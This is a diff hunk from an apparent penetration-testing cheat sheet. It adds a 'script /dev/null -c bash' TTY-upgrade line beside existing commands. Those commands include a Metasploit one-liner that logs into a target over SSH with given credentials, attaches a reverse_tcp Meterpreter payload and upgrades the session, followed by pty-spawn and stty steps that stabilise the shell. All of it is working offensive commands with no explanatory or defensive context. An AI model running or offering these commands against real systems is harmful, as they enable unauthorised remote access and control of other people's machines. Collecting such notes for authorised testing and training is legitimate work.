@@ -1053,6 +1053,8 @@ msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg
 msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/reverse_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/reverse_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run;'
 
 [*] Upgrade TTY
+script /dev/null -c bash
+
 python3 -c 'import pty; pty.spawn("/bin/bash")';
 CTRL-Z
 stty size;stty raw -echo;fg
